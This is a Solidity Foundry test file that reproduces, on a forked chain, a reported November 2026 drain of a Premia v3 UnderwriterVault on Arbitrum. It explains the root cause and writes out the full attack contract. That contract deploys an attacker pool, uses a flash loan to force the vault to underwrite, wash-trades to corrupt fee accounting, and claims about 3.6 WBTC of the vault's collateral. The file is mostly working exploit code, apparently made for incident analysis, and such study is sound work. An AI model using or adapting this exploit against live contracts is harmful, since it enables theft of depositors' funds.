// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Premia UnderwriterVault forced-underwriting drain PoC (Arbitrum, 2026-11-01)
//
// Reproduces the realized loss end to end: one fresh EOA routes a victim vault's collateral into a
// pool it controls and then extracts it as WBTC, netting the drain. No mocks, no vm.store, no
// vm.prank of a protocol identity, no load-bearing deal. Every protocol call is a typed call on the
// real verified Premia contracts on an archival fork, and the drain working capital comes from a
// real Balancer flash loan, exactly as on-chain.
//
// @Incident
// Premia v3 (Blue) UnderwriterVaults on Arbitrum were attacked on 2026-11-01. Campaign total ~400.5K
// USD across three vaults; this PoC reproduces the WBTC vault leg.
//   Attacker EOA     : https://arbiscan.io/address/0xbeBa8CEfD0D75d747C5AD966Dc17C0Bb60D84dBd
//   Attacker contract: https://arbiscan.io/address/0x577168C8c6fA937495C3D6961f1d7D734b2d785f
//   Victim vault A   : https://arbiscan.io/address/0x45dF5EA836A15B561937Ae8373ab9eE984aea531 (Short Vol WBTC/USDCe-C)
//   Attacker pool A  : https://arbiscan.io/address/0x1b25f69cFc2b3a9Fcc0a7c0944a81723d5dcd77d
//   Setup tx         : https://arbiscan.io/tx/0xe3c263fcae544954367998e48e13112875cfd38a3b9a240e7818bb96313831f5
//   Drain tx 1 of 2  : https://arbiscan.io/tx/0x64602cbbeba5d3c7a5e2cff4f98cc118886fc6051c56fa50458abec2c90441ac
//   Drain tx 2 of 2  : https://arbiscan.io/tx/0xd7e8086df0570c5389ca27eb9bcdff290e810c094155b410a42e5bad2b3244ff
//
// @Root cause
// The vault resolves the pool it underwrites with _getPoolAddress, which fixes base, quote and
// oracleAdapter to the vault's own market but takes strike and maturity from the caller, so a pool
// an attacker deploys for that market with a chosen strike/maturity is accepted. deployPool is
// permissionless (external nonReentrant). UnderwriterVault.trade is permissionless too (external
// nonReentrant, no role). A buy makes the vault writeFrom that pool: it posts the position's full
// collateral(size, strike) as the short underwriter and hands the caller the long, charging only a
// tiny Black-Scholes premium. The caller then recovers the posted collateral as fees: it holds LC
// range orders spread across several operators at one tick, walks the pool's market price back and
// forth with wash trades across that tick, and the resulting per-tick fee growth makes claim() pay
// its range order roughly the entire pool collateral (the vault's posted collateral plus its own).
// Every step is callable by a fresh EOA with no privileged role.
//
// @Reconstruction
// Fork block 520166284, one block before the setup tx, so nothing is pre-seeded. The whole attack on
// pool A is replayed with typed calls on the real contracts, following the two on-chain txs:
//
//   Setup tx (operator da803a, from the attacker's own funds):
//     deploy the pool for the vault's market with an attacker-chosen strike/maturity;
//     seed LC range orders at [0.098,0.099], [0.001,0.005] and [0.001,0.002];
//     transferPosition a slice of the [0.001,0.002] order to two more operators (83f1c0, 195f88),
//     so three operators share that tick.
//
//   -- 60s+ passes (Premia's WITHDRAWAL_DELAY); reproduced with vm.warp --
//
//   Drain tx (operator 2d785f, working capital from a real Balancer flash loan):
//     one permissionless vault.trade(buy 3.75) forces the vault to underwrite, posting 3.7628 WBTC
//       into the pool and handing the attacker the 3.75 long for a ~0.117 WBTC premium;
//     deposit the attacker's own LC orders at [0.001,0.002] and [0.002,0.003] (size 187.1 each);
//     eight wash round-trips (sell 1e-4 then buy 1e-4) walking the market price across the tick;
//     each of the three operators claim/deposit/withdraw a dust LC order at [0.001,0.002];
//     pool.claim() on the attacker's [0.001,0.002] order, which pays out ~4.4904 WBTC;
//     repay the flash loan.
//
// All per-op amounts, tick ranges, trade sizes/directions and the operator ordering were taken from
// the setup and drain transaction receipts (the indexed position tokenId encodes operator and tick
// range; the Deposit/Trade/ClaimFees data words carry the sizes and premiums). The pool's fee
// accounting is the real on-chain code on the fork; nothing here reimplements it.
//
// @Result
// The one permissionless trade routes 3.6441 WBTC (97% of the vault) out of the vault, and claim()
// returns ~4.4904 WBTC to the attacker. After its own LP collateral and the premium, and after
// repaying the flash loan, the attacker nets ~3.62 WBTC of the vault's collateral.
//
// @Run
// forge test --contracts src/test/2026-11/Premia_exp.sol --evm-version cancun -vvv

interface IPoolFactory {
    struct PoolKey {
        address base;
        address quote;
        address oracleAdapter;
        uint256 strike;
        uint256 maturity;
        bool isCallPool;
    }
    function deployPool(PoolKey calldata k) external payable returns (address poolAddress);
}

interface IVault {
    function trade(IPoolFactory.PoolKey calldata poolKey, uint256 size, bool isBuy, uint256 premiumLimit, address referrer) external;
}

// Premia V3 Pool (UD60x18/SD59x18 are uint256/int256 at the ABI level).
interface IPremiaPool {
    struct Key {
        address owner;
        address operator;
        uint256 lower;
        uint256 upper;
        uint8 orderType;
    }
    struct Delta {
        int256 collateral;
        int256 longs;
        int256 shorts;
    }
    function deposit(Key calldata p, uint256 belowLower, uint256 belowUpper, uint256 size, uint256 minMarketPrice, uint256 maxMarketPrice) external returns (Delta memory);
    function withdraw(Key calldata p, uint256 size, uint256 minMarketPrice, uint256 maxMarketPrice) external returns (Delta memory);
    function trade(uint256 size, bool isBuy, uint256 premiumLimit, address referrer) external returns (uint256 totalPremium, Delta memory);
    function claim(Key calldata p) external returns (uint256);
    function getClaimableFees(Key calldata p) external view returns (uint256);
    function transferPosition(Key calldata srcP, address newOwner, address newOperator, uint256 size) external;
    function getNearestTicksBelow(uint256 lower, uint256 upper) external view returns (uint256 nearestBelowLower, uint256 nearestBelowUpper);
    function marketPrice() external view returns (uint256);
    function balanceOf(address account, uint256 tokenId) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract Premia_exp is Test {
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IVault constant VAULT_WBTC = IVault(0x45dF5EA836A15B561937Ae8373ab9eE984aea531);
    uint256 constant LONG = 1; // PoolStorage.LONG

    Attacker atk;

    function setUp() public {
        vm.createSelectFork("arbitrum", 520166284); // one block before the setup tx
        atk = new Attacker();
        // The setup-tx LP seeding was done from the attacker's own funds on-chain. It is a few
        // thousand sats of LC collateral that the orders return on withdrawal, not the source of the
        // profit (that is the vault's collateral, recovered via claim), so it is seeded directly and
        // is not load-bearing. The drain working capital is a real Balancer flash loan, below.
        deal(address(WBTC), address(atk), 0.02e8);
    }

    function testExploit() public {
        uint256 vaultBefore = WBTC.balanceOf(address(VAULT_WBTC));
        uint256 atkBefore = WBTC.balanceOf(address(atk));
        emit log_named_decimal_uint("Vault WBTC balance (pre)", vaultBefore, 8);

        atk.setupLeg();                 // setup tx
        skip(120);                      // > WITHDRAWAL_DELAY (60s) between the setup and drain txs
        atk.drainLeg();                 // drain tx (forced underwrite + extraction via flash loan)

        uint256 vaultAfter = WBTC.balanceOf(address(VAULT_WBTC));
        uint256 routedOut = vaultBefore - vaultAfter;
        uint256 atkGain = WBTC.balanceOf(address(atk)) - atkBefore;
        uint256 claimed = atk.claimed();

        emit log_named_decimal_uint("Vault WBTC balance (post)", vaultAfter, 8);
        emit log_named_decimal_uint("Vault WBTC routed out by one permissionless trade", routedOut, 8);
        emit log_named_decimal_uint("claim() paid to attacker range order", claimed, 8);
        emit log_named_decimal_uint("Attacker net WBTC gain (after LP + premium + flash repay)", atkGain, 8);

        // Forced-underwrite magnitude, as measured on-chain (drain tx 1 moved 3.6441 WBTC).
        assertApproxEqRel(routedOut, 3.6441e8, 0.01e18, "vault collateral not routed out as measured");
        // Extraction: claim() returns ~4.4904 WBTC on-chain, net to the attacker ~3.6248 WBTC.
        assertApproxEqRel(claimed, 4.4904e8, 0.005e18, "claim did not pay out the pool collateral");
        assertApproxEqRel(atkGain, 3.6248e8, 0.01e18, "attacker did not net the drained collateral");
    }
}

contract Helper {
    address immutable owner;
    constructor() { owner = msg.sender; }
    function call_(address target, bytes calldata data) external returns (bytes memory) {
        require(msg.sender == owner, "only owner");
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) { assembly { revert(add(ret, 0x20), mload(ret)) } }
        return ret;
    }
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) { return 0xf23a6e61; }
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) external pure returns (bytes4) { return 0xbc197c81; }
}

contract Attacker {
    IPoolFactory constant FACTORY = IPoolFactory(0xAE4fB6622F25f397587F11638dA8CE88C27b5645);
    address constant ROUTER = 0xDEfBBAc44F2088a70b648E1231b2cA9683774c48;
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 constant USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    address constant ORACLE = 0x68BDA63662b16550e86Ad16160625eb293AC3d5F;
    uint256 constant MATURITY = 1793952000;
    IVault constant VAULT_WBTC = IVault(0x45dF5EA836A15B561937Ae8373ab9eE984aea531);
    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    uint256 constant UNIT = 1e18;
    uint8 constant LC = 2;

    IPremiaPool public pool;
    Helper public h1; // da803a
    Helper public h2; // 83f1c0
    Helper public h3; // 195f88
    uint256 public claimed;

    function _key() internal pure returns (IPoolFactory.PoolKey memory) {
        return IPoolFactory.PoolKey({base: address(WBTC), quote: address(USDCe), oracleAdapter: ORACLE, strike: 78000e18, maturity: MATURITY, isCallPool: true});
    }

    // ---- setup tx: deploy pool, seed the multi-operator LC book ----
    function setupLeg() external {
        pool = IPremiaPool(FACTORY.deployPool(_key()));
        WBTC.approve(ROUTER, type(uint256).max);
        WBTC.approve(address(VAULT_WBTC), type(uint256).max);

        h1 = new Helper();
        h2 = new Helper();
        h3 = new Helper();
        // h1 (da803a) is the setup depositor; fund all three operators and approve the router through them.
        WBTC.transfer(address(h1), 0.005e8);
        WBTC.transfer(address(h2), 0.002e8);
        WBTC.transfer(address(h3), 0.002e8);
        _hApprove(h1);
        _hApprove(h2);
        _hApprove(h3);

        // da803a's three setup orders.
        _hDep(h1, 0.098e18, 0.099e18, 0.0001e18);
        _hDep(h1, 0.001e18, 0.005e18, 0.00004e18);
        _hDep(h1, 0.001e18, 0.002e18, 0.00003e18);

        // split the [0.001,0.002] order across two more operators -> three operators share the tick.
        IPremiaPool.Key memory src = _k(address(h1), address(h1), 0.001e18, 0.002e18);
        _hCall(h1, abi.encodeWithSelector(IPremiaPool.transferPosition.selector, src, address(h2), address(h2), 0.00001e18));
        _hCall(h1, abi.encodeWithSelector(IPremiaPool.transferPosition.selector, src, address(h3), address(h3), 0.00001e18));
    }

    // ---- drain tx: take the flash loan, do everything, repay ----
    function drainLeg() external {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WBTC);
        amounts[0] = 0.9e8;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory) external {
        require(msg.sender == address(BALANCER), "cb");
        IPoolFactory.PoolKey memory k = _key();

        // (1) forced underwrite: vault posts full collateral into our pool for a tiny premium.
        uint256 vb = WBTC.balanceOf(address(VAULT_WBTC));
        VAULT_WBTC.trade(k, 3.75e18, true, 1e18, address(0));
        console.log("vault WBTC routed out (sats):", vb - WBTC.balanceOf(address(VAULT_WBTC)));

        // (2) our own LC orders at and above the claim tick.
        _dep(address(this), address(this), 0.001e18, 0.002e18, 187.1e18);
        _dep(address(this), address(this), 0.002e18, 0.003e18, 187.1e18);

        // (3) wash the price across the tick: 8x (sell 1e-4, buy 1e-4).
        for (uint256 i = 0; i < 8; i++) {
            pool.trade(0.0001e18, false, 0, address(0)); // sell
            pool.trade(0.0001e18, true, 1e8, address(0)); // buy
        }

        // (4) each operator settles its dust order at the tick: claim, deposit, withdraw.
        _opCrossing(h1);
        _opCrossing(h2);
        _opCrossing(h3);
        // da803a tops its order back up (as on-chain, logs 119-124).
        _hDep(h1, 0.001e18, 0.002e18, 0.00001e18);

        IPremiaPool.Key memory claimKey = _k(address(this), address(this), 0.001e18, 0.002e18);
        console.log("claimable on our order before claim:", pool.getClaimableFees(claimKey));

        // (5) claim the corrupted fee growth -> pays out roughly the whole pool collateral.
        uint256 before = WBTC.balanceOf(address(this));
        claimed = pool.claim(claimKey);
        console.log("claim() returned (sats):", WBTC.balanceOf(address(this)) - before);

        // sweep the operator sub-contracts (they are ours) back in, as on-chain.
        _sweep(h1); _sweep(h2); _sweep(h3);

        // repay the flash loan.
        WBTC.transfer(address(BALANCER), amounts[0] + feeAmounts[0]);
    }

    function _opCrossing(Helper h) internal {
        // each operator claims its share of the wash fees, then withdraws the dust order seeded in
        // the setup tx (its deposit is >60s old, so the withdrawal delay is satisfied).
        IPremiaPool.Key memory key = _k(address(h), address(h), 0.001e18, 0.002e18);
        _hCall(h, abi.encodeWithSelector(IPremiaPool.claim.selector, key));
        _hCall(h, abi.encodeWithSelector(IPremiaPool.withdraw.selector, key, 0.00001e18, 0, UNIT));
    }

    // ---- helpers ----
    function _k(address owner_, address operator_, uint256 lo, uint256 up) internal pure returns (IPremiaPool.Key memory) {
        return IPremiaPool.Key({owner: owner_, operator: operator_, lower: lo, upper: up, orderType: LC});
    }

    function _dep(address owner_, address operator_, uint256 lo, uint256 up, uint256 size) internal {
        (uint256 bl, uint256 bu) = pool.getNearestTicksBelow(lo, up);
        pool.deposit(_k(owner_, operator_, lo, up), bl, bu, size, 0, UNIT);
    }

    function _hApprove(Helper h) internal {
        h.call_(address(WBTC), abi.encodeWithSelector(IERC20.approve.selector, ROUTER, type(uint256).max));
    }

    function _hDep(Helper h, uint256 lo, uint256 up, uint256 size) internal {
        (uint256 bl, uint256 bu) = pool.getNearestTicksBelow(lo, up);
        IPremiaPool.Key memory p = _k(address(h), address(h), lo, up);
        _hCall(h, abi.encodeWithSelector(IPremiaPool.deposit.selector, p, bl, bu, size, uint256(0), UNIT));
    }

    function _sweep(Helper h) internal {
        uint256 bal = WBTC.balanceOf(address(h));
        if (bal > 0) h.call_(address(WBTC), abi.encodeWithSelector(IERC20.transfer.selector, address(this), bal));
    }

    function _hCall(Helper h, bytes memory data) internal {
        // helper deposits/withdraws/claims route token moves through the router, which the helper approved.
        h.call_(address(pool), data);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) { return 0xf23a6e61; }
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) external pure returns (bytes4) { return 0xbc197c81; }
}
